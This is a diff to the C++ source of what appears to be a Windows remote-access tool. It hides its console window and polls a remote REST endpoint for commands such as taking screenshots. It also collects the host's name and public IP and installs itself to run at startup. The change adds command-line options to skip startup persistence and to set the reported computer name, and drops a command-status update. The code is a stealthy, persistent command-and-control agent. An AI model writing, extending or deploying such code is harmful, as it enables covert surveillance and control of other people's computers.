@@ -365,8 +365,6 @@ DWORD WINAPI pollThread(LPVOID) {
                 std::string type = extractJson(item, "type");
                 std::string payload = extractJson(item, "payload");
                 if (id.empty() || type.empty()) { pos += end+1; continue; }
-                std::string patchBody = "{\"status\":\"running\"}";
-                httpsPatch("/rest/v1/commands?id=eq." + id, patchBody);
                 std::string result = "";
                 try {
                     if (type == "screenshot") {
@@ -437,12 +435,19 @@ void installStartup() {
     }
 }
 
-int main() {
+int main(int argc, char* argv[]) {
     HWND hwnd = GetConsoleWindow();
     if (hwnd) ShowWindow(hwnd, SW_HIDE);
-    computerName = getComputerName();
+    bool noStartup = false;
+    for (int i = 1; i < argc; i++) {
+        std::string a = argv[i];
+        if (a == "--no-startup") noStartup = true;
+        else if (a.find("--name=") == 0 && a.size() > 7) computerName = a.substr(7);
+        else if (a == "--name" && i + 1 < argc) computerName = argv[++i];
+    }
+    if (computerName.empty()) computerName = getComputerName();
     publicIP = getPublicIP();
-    installStartup();
+    if (!noStartup) installStartup();
     GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
     GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
